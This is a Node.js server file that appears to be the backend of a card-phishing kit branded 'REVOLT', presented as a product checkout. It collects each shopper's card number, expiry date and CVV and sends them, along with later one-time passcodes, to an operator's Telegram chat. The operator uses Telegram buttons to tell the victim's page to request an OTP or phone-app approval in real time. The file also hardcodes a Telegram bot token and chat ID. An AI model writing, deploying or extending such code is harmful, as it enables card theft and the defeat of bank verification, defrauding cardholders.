const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const axios = require('axios');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const TELEGRAM_TOKEN = '8105017890:AAGUgv5PhIDq-tSO5mmNiDc4fV8WZWmnxMk';
const ADMIN_CHAT_ID = '6410887780';

app.use(express.static('.'));
app.use(express.json());

let sessions = {}; 

io.on('connection', (socket) => {
    socket.on('customer-order', (data) => {
        sessions[data.card] = socket.id;
        const msg = `🚀 *REVOLT NEW ORDER*\n\n📦 Product: *${data.product}*\n💰 Plan: *${data.plan}*\n🏷️ Code: *${data.discountCode}*\n💵 TOTAL: *€${data.finalPrice}*\n\n👤 Name: ${data.name}\n💳 Card: \`${data.card}\` \n📅 Expiry: ${data.expiry} \n🔒 CVV: ${data.cvv}`;
        const kb = { inline_keyboard: [[{ text: "✅ Approve", callback_data: `approve_${data.card}` }, { text: "❌ Reject", callback_data: `reject_${data.card}` }], [{ text: "🔑 Req OTP", callback_data: `askOTP_${data.card}` }, { text: "📱 Phone App", callback_data: `phoneApp_${data.card}` }]] };
        sendToTelegram(msg, kb);
    });

    socket.on('customer-otp', (otp) => {
        const msg = `📩 *REVOLT OTP RECEIVED*\n\nCard: \`${otp.cardId}\` \nCode: *${otp.code}*`;
        const kb = { inline_keyboard: [[{ text: "✅ Success", callback_data: `approve_${otp.cardId}` }, { text: "❌ Wrong", callback_data: `askOTP_${otp.cardId}` }]] };
        sendToTelegram(msg, kb);
    });
});

app.post('/telegram-webhook', (req, res) => {
    const cb = req.body.callback_query;
    if (cb) {
        const [action, cid] = cb.data.split('_');
        const sid = sessions[cid];
        if (sid) io.to(sid).emit('admin-instruction', action);
        axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, { callback_query_id: cb.id, text: `Cmd: ${action}` });
    }
    res.sendStatus(200);
});

async function sendToTelegram(text, kb) {
    try { await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, { chat_id: ADMIN_CHAT_ID, text: text, parse_mode: 'Markdown', reply_markup: kb }); } catch (e) { console.log(e.message); }
}

server.listen(process.env.PORT || 3000, () => console.log('REVOLT IS LIVE'));
